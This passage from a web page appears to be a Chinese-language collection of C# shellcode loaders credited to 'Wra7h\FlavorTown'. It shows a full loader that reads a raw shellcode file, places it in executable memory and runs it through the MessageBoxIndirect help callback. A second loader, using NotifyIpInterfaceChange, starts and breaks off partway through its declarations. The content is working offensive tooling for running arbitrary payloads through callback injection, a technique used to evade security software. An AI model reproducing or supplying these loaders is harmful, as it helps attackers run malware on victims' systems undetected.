class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">MFShutdown</span>(<span class="hljs-params"></span>)</span>;<br><span class="linenum hljs-number">78</span><br><span class="linenum hljs-number">79</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">80</span>}<br></code></pre>
<h1 id="h7cmessageboxindirect"><span>7.回调函数注入 (C#) 通过 MessageBoxIndirect</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.IO;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 7</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">MessageBoxIndirect</span><br><span class="linenum hljs-number">10</span>{<br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;MessageBoxIndirect.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">21</span><br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSGBOXPARAMS&nbsp;sMsgBoxParams&nbsp;=&nbsp;<span class="hljs-keyword">new</span>&nbsp;MSGBOXPARAMS();<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sMsgBoxParams.dwStyle&nbsp;=&nbsp;(<span class="hljs-keyword">uint</span>)(<span class="hljs-number">0x00004000</span>L);&nbsp;<span class="hljs-comment">//&nbsp;Should&nbsp;have&nbsp;an&nbsp;ok&nbsp;button&nbsp;and&nbsp;a&nbsp;help&nbsp;button</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sMsgBoxParams.lpfnMsgBoxCallback&nbsp;=&nbsp;hAlloc;&nbsp;<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sMsgBoxParams.lpszText&nbsp;=&nbsp;<span class="hljs-string">"Click&nbsp;help&nbsp;for&nbsp;shellcode!"</span>;<br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sMsgBoxParams.cbSize&nbsp;=&nbsp;(<span class="hljs-keyword">uint</span>)Marshal.SizeOf(sMsgBoxParams);<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MessageBoxIndirect(sMsgBoxParams);<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">55</span><br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">63</span><br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"user32.dll"</span>,&nbsp;SetLastError&nbsp;=&nbsp;true,&nbsp;CharSet&nbsp;=&nbsp;CharSet.Auto)</span>]<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">MessageBoxIndirect</span>(<span class="hljs-params">MSGBOXPARAMS&nbsp;lbmp</span>)</span>;<br><span class="linenum hljs-number">66</span><br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">StructLayout(LayoutKind.Sequential)</span>]<br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">struct</span>&nbsp;MSGBOXPARAMS<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;cbSize;<br><span class="linenum hljs-number">71</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;hwndOwner;<br><span class="linenum hljs-number">72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;hInstance;<br><span class="linenum hljs-number">73</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">MarshalAs(UnmanagedType.LPWStr)</span>]&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">string</span>&nbsp;lpszText;<br><span class="linenum hljs-number">74</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">MarshalAs(UnmanagedType.LPWStr)</span>]&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">string</span>&nbsp;lpszCaption;<br><span class="linenum hljs-number">75</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwStyle;<br><span class="linenum hljs-number">76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;lpszIcon;<br><span class="linenum hljs-number">77</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;dwContextHelpId;<br><span class="linenum hljs-number">78</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;lpfnMsgBoxCallback;<br><span class="linenum hljs-number">79</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwLanguageId;<br><span class="linenum hljs-number">80</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">81</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">82</span>}<br></code></pre>
<h1 id="h8cnotifyipinterfacechange"><span>8.回调函数注入 (C#) 通过 NotifyIpInterfaceChange</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">NotifyIpInterfaceChange</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;NotifyIpInterfaceChange.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;AF_UNSPEC&nbsp;=&nbsp;<span class="hljs-number">0x0</span>;<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hNotification&nbsp;=&nbsp;IntPtr.Zero;<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NotifyIpInterfaceChange(AF_UNSPEC,&nbsp;hAlloc,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-literal">true</span>,&nbsp;<span class="hljs-keyword">ref</span>&nbsp;hNotification);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum 